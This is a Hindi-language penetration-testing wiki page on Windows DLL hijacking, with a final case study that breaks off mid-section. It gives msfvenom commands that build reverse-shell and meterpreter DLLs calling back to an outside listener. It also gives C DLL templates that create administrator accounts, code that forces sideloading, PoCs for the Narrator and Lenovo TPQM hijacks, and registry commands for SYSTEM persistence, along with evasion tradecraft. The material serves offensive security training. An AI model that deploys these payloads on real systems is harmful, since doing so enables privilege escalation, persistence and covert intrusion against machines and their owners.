# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## मूल जानकारी

DLL Hijacking एक भरोसेमंद एप्लिकेशन को किसी दुर्भावनापूर्ण DLL को लोड करने के लिए प्रवृत्त करने की प्रक्रिया है। यह शब्द कई तरीकों को शामिल करता है जैसे **DLL Spoofing, Injection, and Side-Loading**। इसे मुख्य रूप से कोड निष्पादन, persistence हासिल करने और कम सामान्य रूप से privilege escalation के लिए उपयोग किया जाता है। यहाँ escalation पर फोकस होने के बावजूद, hijacking की विधि उद्देश्यों के बीच समान रहती है।

### सामान्य तकनीकें

DLL hijacking के लिए कई तरीके उपयोग किए जाते हैं, और इनकी प्रभावशीलता एप्लिकेशन की DLL लोडिंग रणनीति पर निर्भर करती है:

1. **DLL Replacement**: वास्तविक DLL को एक दुर्भावनापूर्ण DLL से बदलना, वैकल्पिक रूप से मूल DLL की कार्यक्षमता बनाए रखने के लिए DLL Proxying का उपयोग।
2. **DLL Search Order Hijacking**: दुर्भावनापूर्ण DLL को उस खोज पाथ में रख देना जो वैध DLL से पहले सर्च होता है, ताकि एप्लिकेशन के खोज पैटर्न का फायदा उठाया जा सके।
3. **Phantom DLL Hijacking**: ऐसा दुर्भावनापूर्ण DLL बनाना जिसे एप्लिकेशन लोड करे, यह सोचकर कि वह आवश्यक DLL मौजूद नहीं था।
4. **DLL Redirection**: खोज पैरामीटर जैसे `%PATH%` या `.exe.manifest` / `.exe.local` फ़ाइलों को संशोधित करके एप्लिकेशन को दुर्भावनापूर्ण DLL की ओर निर्देशित करना।
5. **WinSxS DLL Replacement**: WinSxS डायरेक्टरी में वैध DLL को दुर्भावनापूर्ण संस्करण से बदलना, यह तरीका अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: कॉपी किए गए एप्लिकेशन के साथ उपयोगकर्ता-नियंत्रित डायरेक्टरी में दुर्भावनापूर्ण DLL रखकर, Binary Proxy Execution तकनीकों जैसा व्यवहार।

> [!TIP]
> DLL sideloading के ऊपर HTML staging, AES-CTR configs, और .NET implants जैसी परतें लगाने वाली एक step-by-step चेन के लिए, नीचे दिया गया workflow देखें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## गायब Dlls ढूँढना

सिस्टम के अंदर गायब Dlls ढूँढने का सबसे सामान्य तरीका sysinternals का [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना है, और निम्नलिखित 2 फ़िल्टर सेट करना:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

और केवल **File System Activity** दिखाएँ:

![](<../../../images/image (153).png>)

यदि आप सामान्यत: **गायब dlls** ढूँढ रहे हैं तो इसे कुछ **सेकंड** के लिए चलने दें।\
यदि आप किसी **विशिष्ट executable** के अंदर **गायब dll** खोज रहे हैं तो आपको एक अतिरिक्त फ़िल्टर सेट करना चाहिए जैसे "Process Name" "contains" `<exec name>`, उसे execute करें, और events कैप्चर करना बंद कर दें।

## Exploiting Missing Dlls

Privilege escalation के लिए हमारी सबसे अच्छी संभावना यह है कि हम एक ऐसा DLL लिख सकें जिसे कोई privilege process लोड करने की कोशिश करेगा, और वह DLL किसी ऐसे स्थान पर लिखा जा सके जहाँ उसे original DLL से पहले खोजा जाये। इसलिए, हम या तो किसी ऐसी फोल्डर में DLL लिख पाएंगे जहाँ DLL मूल DLL वाली फोल्डर से पहले खोजा जाता है (एक अजीब केस), या हम किसी ऐसी फोल्डर में लिख पाएंगे जहाँ DLL खोजा जाएगा और किसी भी फोल्डर में मूल DLL मौजूद नहीं होगा।

### Dll Search Order

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) में आप देख सकते हैं कि Dlls कैसे विशेष रूप से लोड होते हैं।

Windows applications DLLs को कुछ पूर्व-निर्धारित खोज पाथ का पालन करके ढूँढते हैं, एक विशेष अनुक्रम का पालन करते हुए। DLL hijacking तब पैदा होता है जब एक हानिकारक DLL को रणनीतिक रूप से इन डायरेक्टरीज़ में से किसी एक में रखा जाता है ताकि वह वैध DLL से पहले लोड हो जाए। इसे रोकने का एक समाधान यह है कि एप्लिकेशन DLLs का संदर्भ लेते समय absolute paths का उपयोग करे।

आप 32-bit सिस्टम्स पर DLL खोज क्रम नीचे देख सकते हैं:

1. उस डायरेक्टरी से जहाँ से एप्लिकेशन लोड हुआ।
2. system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. 16-bit system directory. इसका path प्राप्त करने वाली कोई function नहीं है, पर यह खोज में शामिल है। (_C:\Windows\System_)
4. Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. वर्तमान डायरेक्टरी।
6. PATH environment variable में लिस्ट की गई डायरेक्टरीज़। ध्यान दें कि इसमें वह per-application path शामिल नहीं है जो **App Paths** registry key द्वारा निर्दिष्ट होता है। **App Paths** key DLL search path की गणना करते समय उपयोग नहीं होता।

यह **default** खोज क्रम है जब **SafeDllSearchMode** सक्षम होता है। जब यह अक्षम होता है तो current directory दूसरे स्थान पर आ जाता है। इस फीचर को अक्षम करने के लिए, **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाकर उसे 0 पर सेट करें (डिफ़ॉल्ट रूप से सक्षम है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) फ़ंक्शन को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ कॉल किया जाता है तो खोज उस executable मॉड्यूल की डायरेक्टरी से शुरू होती है जिसे **LoadLibraryEx** लोड कर रहा है।

अंत में, ध्यान दें कि **एक dll को केवल नाम देने के बजाय absolute path बता कर भी लोड किया जा सकता है**। उस मामले में वह dll केवल उसी path में ही खोजा जाएगा (यदि उस dll की कोई dependencies हों, तो उन्हें नाम से लोड करते समय जैसा लोड किया गया था उसी तरह खोजा जाएगा)।

खोज क्रम को प्रभावित करने के और तरीके भी हैं पर मैं उन्हें यहाँ विस्तार से बताने नहीं जा रहा।

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

ऑपरेशनल उपयोग का उदाहरण
- अपने DllPath डायरेक्टरी में एक malicious xmllite.dll रखें (जो आवश्यक functions export करे या असली वाले को proxy करे)।
- उपरोक्त तकनीक का उपयोग करते हुए उस signed binary को लॉन्च करें जो नाम से xmllite.dll को ढूंढता है। loader सप्लाई किए गए DllPath के जरिए import को resolve करता है और आपकी DLL को sideload करता है।

यह तकनीक इन-द-वाइल्ड में multi-stage sideloading chains चलाने के लिए देखी गई है: एक प्रारंभिक launcher एक helper DLL छोड़ता है, जो फिर एक Microsoft-signed, hijackable binary को spawn करता है जिसमें custom DllPath होता है ताकि staging directory से attacker की DLL को लोड करने के लिए मजबूर किया जा सके।


#### Windows दस्तावेज़ों में दिए गए DLL खोज क्रम के अपवाद

Windows दस्तावेज़ों में मानक DLL खोज क्रम के कुछ अपवाद नोट किए गए हैं:

- जब कोई **DLL जिसका नाम पहले से memory में लोड एक DLL के नाम से मेल खाता है** मिलता है, तो सिस्टम सामान्य खोज को बायपास कर देता है। इसके बजाय, यह redirection और manifest के लिए जांच करता है, और फिर memory में पहले से मौजूद DLL पर default कर देता है। **इस स्थिति में, सिस्टम DLL के लिए खोज नहीं करता है**।
- ऐसे मामलों में जहां DLL को current Windows version के लिए **known DLL** के रूप में पहचाना जाता है, सिस्टम उस known DLL के अपने version का उपयोग करेगा, साथ ही इसके किसी भी dependent DLLs का भी, **खोज प्रक्रिया को छोड़ते हुए**। रजिस्ट्री की **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** इन known DLLs की सूची रखती है।
- यदि किसी **DLL की dependencies** हों, तो इन dependent DLLs के लिए खोज ऐसा ही की जाती है जैसे उन्हें केवल उनके **module names** से संकेत किया गया हो, चाहे प्रारंभिक DLL को full path से पहचाना गया हो या नहीं।

### Escalating Privileges

**आवश्यकताएँ**:

- ऐसी प्रक्रिया पहचानें जो **different privileges** (horizontal or lateral movement) के तहत काम करती है या करेगी, और जिसमें **lacking a DLL** हो।
- सुनिश्चित करें कि किसी भी **directory** में जहाँ **DLL** को **searched for** किया जाएगा, आपके पास **write access** उपलब्ध हो। यह स्थान executable की डायरेक्टरी या system path के भीतर कोई डायरेक्टरी हो सकता है।

हाँ, आवश्यकताएँ ढूँढना जटिल है क्योंकि **डिफ़ॉल्ट रूप से किसी privileged executable में dll की कमी मिलना अजीब है** और **system path फ़ोल्डर पर write permissions होना और भी अजीब है** (आप डिफ़ॉल्ट रूप से ऐसा नहीं कर सकते)। लेकिन misconfigured environments में यह संभव हो सकता है.\
अगर आप भाग्यशाली हैं और आवश्यकताओं को पूरा कर लेते हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) प्रोजेक्ट देख सकते हैं। भले ही प्रोजेक्ट का **main goal bypass UAC** होना हो, वहाँ आपको उस Windows version के लिए Dll hijacking का एक **PoC** मिल सकता है जिसे आप उपयोग कर सकते हैं (शायद सिर्फ उस फ़ोल्डर के path को बदलकर जहाँ आपकी write permissions हैं)।

ध्यान दें कि आप किसी फ़ोल्डर में अपनी **permissions** इस तरह जाँच सकते हैं:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी फ़ोल्डरों की permissions जांचें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप executable के imports और dll के exports भी निम्न के साथ जांच सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
यदि आपके पास **System Path folder** में लिखने की अनुमति है तो **abuse Dll Hijacking to escalate privileges** करने के लिए पूरी गाइड देखें:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### स्वचालित उपकरण

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जांचेगा कि क्या आपके पास system PATH के किसी फ़ोल्डर में लिखने की अनुमति है।\
इस vulnerability का पता लगाने के लिए अन्य दिलचस्प स्वचालित उपकरण **PowerSploit functions** हैं: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### उदाहरण

यदि आप एक exploitable scenario पाते हैं तो इसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण चीजों में से एक यह होगी कि आप **एक dll बनाएँ जो कम से कम उन सभी functions को export करे जिन्हें executable उससे import करेगा**। वैसे भी, ध्यान रखें कि Dll Hijacking उपयोगी होता है [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) तक पहुँचने के लिए। आप execution के लिए केन्द्रित इस dll hijacking अध्ययन में यह देख सकते हैं कि **how to create a valid dll**: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, **next sectio**n में आप कुछ **basic dll codes** पा सकते हैं जो **templates** के रूप में उपयोगी हो सकते हैं या ऐसी **dll with non required functions exported** बनाने के लिए मददगार हो सकते हैं।

## **Dlls बनाना और कंपाइल करना**

### **Dll Proxifying**

मूलतः एक **Dll proxy** वह Dll होता है जो लोड होने पर आपका malicious code execute कर सके और साथ ही वास्तविक लाइब्रेरी को कॉल्स relay करके उम्मीद के मुताबिक **expose** और **work** भी करे।

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) टूल के साथ आप वास्तव में **किसी executable को indicate करके वह library चुन सकते हैं** जिसे आप proxify करना चाहते हैं और **एक proxified dll generate** कर सकते हैं या **Dll indicate करके** **एक proxified dll generate** कर सकते हैं।

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक meterpreter (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएं (x86 — मुझे x64 संस्करण नहीं दिखा):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### अपना

ध्यान दें कि कई मामलों में वह Dll जिसे आप compile करते हैं, उसे **export several functions** करना आवश्यक होता है जो victim process द्वारा load हों; यदि ये functions मौजूद नहीं हैं तो **binary won't be able to load** उन्हें और **exploit will fail**।

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL उदाहरण (उपयोगकर्ता निर्माण के साथ)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>थ्रेड एंट्री के साथ वैकल्पिक C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe अभी भी शुरू होने पर एक पूर्वानुमेय, भाषा-विशिष्ट localization DLL की जाँच करता है जिसे hijack करके arbitrary code execution और persistence हासिल किया जा सकता है।

मुख्य तथ्य
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- यदि OneCore पथ पर एक writable attacker-controlled DLL मौजूद है, तो वह लोड हो जाती है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। No exports are required.

Procmon के साथ खोज
- फ़िल्टर: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator शुरू करें और ऊपर दिए गए पथ के लोड करने के प्रयास को देखें।

न्यूनतम DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. शांत रहने के लिए, attach करते समय Narrator threads को enumerate करें, मुख्य थ्रेड को (`OpenThread(THREAD_SUSPEND_RESUME)`) खोलें और उसे `SuspendThread` करके रोक दें; अपना काम अपनी थ्रेड में जारी रखें। पूर्ण कोड के लिए PoC देखें।

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- उपरोक्त सेटिंग के साथ, Narrator शुरू करने पर planted DLL लोड हो जाती है। secure desktop (logon screen) पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ; आपका DLL secure desktop पर SYSTEM के रूप में execute होगा।

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- होस्ट पर RDP करें, logon screen पर Narrator लॉन्च करने के लिए CTRL+WIN+ENTER दबाएँ; आपका DLL secure desktop पर SYSTEM के रूप में execute होगा।
- Execution तब रुक जाती है जब RDP session बंद होता है — इसलिए तुरंत inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप एक built-in Accessibility Tool (AT) registry entry (उदा., CursorIndicator) को clone कर सकते हैं, उसे किसी arbitrary binary/DLL की ओर point करने के लिए edit करें, import करें, और फिर `configuration` को उस AT नाम पर सेट करें। यह Accessibility framework के अंतर्गत arbitrary execution को proxy करता है।

Notes
- `%windir%\System32` के अंतर्गत लिखना और HKLM मान बदलना admin rights की माँग करता है।
- सारा payload logic `DLL_PROCESS_ATTACH` में रखा जा सकता है; किसी exports की आवश्यकता नहीं है।

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

यह केस Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** को दर्शाता है, जिसे **CVE-2025-1729** के रूप में ट्रैक किया गया है।

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` स्थित है `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` रोज़ाना सुबह 9:30 AM पर logged-on user के context में चलती है।
- **Directory Permissions**: यह डायरेक्टरी `CREATOR OWNER` द्वारा writable है, जिससे local users arbitrary files डाल सकते हैं।
- **DLL Search Behavior**: यह पहले अपने working directory से `hostfxr.dll` लोड करने की कोशिश करता है और यदि नहीं मिलता तो "NAME NOT FOUND" लॉग करता है, जो local directory search की प्राथमिकता को दर्शाता है।

### Exploit Implementation

एक attacker उसी directory में malicious `hostfxr.dll` stub रख सकता है, गायब DLL का फायदा उठाकर user's context में code execution हासिल करने के लिए:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### हमला प्रवाह

1. एक सामान्य उपयोगकर्ता के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में रखें।
2. वर्तमान उपयोगकर्ता के संदर्भ में निर्धारित कार्य के सुबह 9:30 बजे चलने का इंतजार करें।
3. यदि जब कार्य निष्पादित होता है तब कोई प्रशासक लॉग इन है, तो दुर्भावनापूर्ण DLL प्रशासक के सत्र में medium integrity पर चलती है।
4. medium integrity से SYSTEM privileges तक उठाने के लिए मानक UAC bypass तकनीकों को चैन करें।

## केस स्टडी: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

हमलावर अक्सर MSI-आधारित droppers को DLL side-loading के साथ जोड़ते हैं ताकि वे एक trusted, signed process के तहत payloads को निष्पादित कर सकें।

Chain overview
- उपयोगकर्ता MSI डाउनलोड करता है। A CustomAction GUI install के दौरान चुपचाप चलता है (उदा., LaunchApplication या VBScript action), और embedded resources से अगले चरण को पुनर्निर्मित करता है।
- Dropper एक वैध, signed EXE और एक दुर्भावनापूर्ण DLL को उसी डायरेक्टरी में लिखता है (उदाहरण जोड़ी: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- जब signed EXE शुरू होता है, तो Windows DLL search order पहले working directory से wsc.dll लोड करता है, जिससे signed parent के तहत हमलावर का कोड निष्पादित होता है (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- ऐसी प्रविष्टियों की तलाश करें जो executables या VBScript चलाती हों। संदिग्ध उदाहरण पैटर्न: LaunchApplication जो background में एक embedded file को निष्पादित करता है।
- Orca (Microsoft Orca.exe) में, CustomAction, InstallExecuteSequence और Binary तालिकाओं की जाँच करें।
- MSI CAB में embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- ऐसी कई छोटी fragments की तलाश करें जो VBScript CustomAction द्वारा concatenated और decrypted की जाती हैं। सामान्य प्रवाह:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe के साथ व्यावहारिक sideloading
- इन दोनों फाइलों को एक ही फोल्डर में रखें:
- wsc_proxy.exe: वैध साइन किया गया host (Avast). प्रोसेस अपने निर्देशिका से नाम द्वारा wsc.dll लोड करने का प्रयास करता है.
- wsc.dll: attacker DLL. यदि किसी specific exports की आवश्यकता नहीं है, तो DllMain पर्याप्त हो सकता है; अन्यथा, एक proxy DLL बनाएं और आवश्यक exports को genuine library को फॉरवर्ड करें जबकि DllMain में payload चलाएँ.
- एक न्यूनतम DLL payload बनाएं:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export आवश्यकताओं के लिए, एक प्रॉक्सी फ्रेमवर्क (उदा., DLLirant/Spartacus) का उपयोग करें ताकि एक forwarding DLL जनरेट हो जो आपका payload भी execute करे।

- यह तकनीक host binary द्वारा DLL नाम समाधान पर निर्भर करती है। यदि host absolute paths या safe loading flags (उदा., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है, तो hijack fail हो सकता है।
- KnownDLLs, SxS, और forwarded exports precedence को प्रभावित कर सकते हैं और host binary और export set के चयन के दौरान इन्हें ध्यान में रखना चाहिए।

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ने बताया कि Ink Dragon ShadowPad को कैसे deploy करता है, एक **तीन-फ़ाइल triad** का उपयोग करके ताकि यह legitimate software में blend हो जाए जबकि core payload डिस्क पर encrypted रहे:

1. **Signed host EXE** – vendors such as AMD, Realtek, or NVIDIA का दुरुपयोग किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)। attackers executable का नाम बदलकर इसे Windows binary जैसा दिखाते हैं (उदा., `conhost.exe`), पर Authenticode signature मान्य रहती है।
2. **Malicious loader DLL** – EXE के बगल में अपेक्षित नाम के साथ drop किया जाता है (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`)। यह आमतौर पर एक MFC binary होता है जिसे ScatterBrain framework से obfuscate किया गया होता है; इसका एकमात्र काम encrypted blob ढूँढना, उसे decrypt करना, और ShadowPad को reflectively map करना होता है।
3. **Encrypted payload blob** – अक्सर उसी directory में `<name>.tmp` के रूप में स्टोर होता है। decrypted payload को memory-map करने के बाद loader TMP फ़ाइल डिलीट कर देता है ताकि forensic सबूत न रहें।

Tradecraft notes:

* साइन किए गए EXE का नाम बदलना (जबकि PE header में मूल `OriginalFileName` रखा जाता है) इसे Windows binary की तरह छद्म बनाता है पर vendor signature बरकरार रहती है, इसलिए Ink Dragon के व्यवहार की नकल करें जिसमें वे `conhost.exe`-जैसी बाइनरी छोड़ते हैं जो वास्तव में AMD/NVIDIA utilities होती हैं।
* क्योंकि executable trusted रहता है, अधिकांश allowlisting controls के लिए केवल आपका malicious DLL उसके साथ होना ही पर्याप्त होता है। loader DLL को customize करने पर ध्यान दें; signed parent आमतौर पर बिना बदले चल सकता है।
* ShadowPad का decryptor अपेक्षा करता है कि TMP blob loader के साथ और writable हो ताकि mapping के बाद वह फ़ाइल को zero कर सके। payload लोड होने तक directory writable रखें; एक बार memory में होने पर TMP फ़ाइल OPSEC कारणों से सुरक्षित रूप से डिलीट की जा सकती है।

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

A recent Lotus Blossom intrusion ने एक trusted update chain का दुरुपयोग करके एक NSIS-packed dropper डिलीवर किया जिसने DLL sideload के साथ पूर्णतः in-memory payloads स्टेज किए।

Tradecraft flow
